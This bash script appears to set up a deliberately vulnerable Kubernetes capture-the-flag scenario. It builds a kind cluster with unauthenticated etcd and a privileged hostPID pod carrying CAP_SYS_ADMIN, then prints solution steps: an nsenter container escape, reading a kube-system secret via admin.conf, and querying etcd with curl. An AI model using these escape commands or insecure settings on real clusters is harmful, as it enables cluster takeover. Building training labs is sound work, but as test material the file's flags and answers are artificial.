#!/bin/bash
# Chain 12: CAP_SYS_ADMIN → Node shell → etcd (3 steps)
set -euo pipefail
K8S_ID="chain12"
CLUSTER_NAME="cve-chain12-caps-cluster"
source "$(dirname "$0")/../../scripts/k8s-common.sh"
FLAG1="${CVE_FLAG1:-flag{chain12-step1-capsys\}}"
FLAG2="${CVE_FLAG2:-flag{chain12-step2-rbac\}}"
FLAG3="${CVE_FLAG3:-flag{chain12-step3-etcd-final\}}"

echo "[Chain 12] CAP_SYS_ADMIN to Full Cluster — 3 steps"

mkdir -p /home/kianabin/cve-flags/chain12
echo "$FLAG1" > /home/kianabin/cve-flags/chain12/flag.txt

kind create cluster --name "$CLUSTER_NAME" --config - << 'KINDCFG'
kind: Cluster
apiVersion: kind.x-k8s.io/v1alpha4
nodes:
  - role: control-plane
    image: kindest/node:v1.27.3
    extraMounts:
      - hostPath: /home/kianabin/cve-flags/chain12
        containerPath: /host-flag
    kubeadmConfigPatches:
      - |
        kind: ClusterConfiguration
        etcd:
          local:
            extraArgs:
              client-cert-auth: "false"
KINDCFG

docker pull bitnami/kubectl:1.28 2>/dev/null || true
kind load docker-image bitnami/kubectl:1.28 --name "$CLUSTER_NAME" 2>/dev/null || true
kubectl wait --for=condition=Ready pods --all -n kube-system --timeout=120s 2>/dev/null || true
sleep 10

# Step 1: CAP_SYS_ADMIN + hostPID pod with cgroup hostPath (flag on the node, NOT mounted)
kubectl apply -f - << YAML
apiVersion: v1
kind: Pod
metadata:
  name: chain12-step1
spec:
  hostPID: true
  containers:
    - name: escape
      image: bitnami/kubectl:1.28
      imagePullPolicy: IfNotPresent
      command: ["sleep", "3600"]
      securityContext:
        capabilities:
          add: ["SYS_ADMIN"]
      volumeMounts:
        - name: cgroup
          mountPath: /sys/fs/cgroup
  volumes:
    - name: cgroup
      hostPath:
        path: /sys/fs/cgroup
YAML

# Step 2 flag: kube-system secret readable only from a node shell (admin.conf)
kubectl create secret generic chain12-step2 --from-literal=flag="$FLAG2" -n kube-system 2>/dev/null || true

# Step 3 final flag: custom etcd key (invisible to the Kubernetes API)
k8s_put_etcd_key "/chain12-final" "$FLAG3"

kubectl wait --for=condition=Ready pod/chain12-step1 --timeout=60s 2>/dev/null || true
sleep 5

echo ""
echo "[Chain 12] Ready"
echo "    Step 1 (cgroup v1): release_agent escape; fallback:"
echo "       kubectl exec chain12-step1 -- nsenter --target 1 --mount -- cat /host-flag/flag.txt"
echo "    Step 2: kubectl exec chain12-step1 -- sh -c 'cp /opt/bitnami/kubectl/bin/kubectl /proc/1/root/usr/local/bin/kubectl'"
echo "       kubectl exec chain12-step1 -- nsenter --target 1 --mount --net -- sh -c \\"
echo "         'KUBECONFIG=/etc/kubernetes/admin.conf kubectl get secret chain12-step2 -n kube-system -o jsonpath={.data.flag} | base64 -d'"
echo "    Step 3: node shell -> curl -k https://127.0.0.1:2379/v3/kv/range (key /chain12-final)"
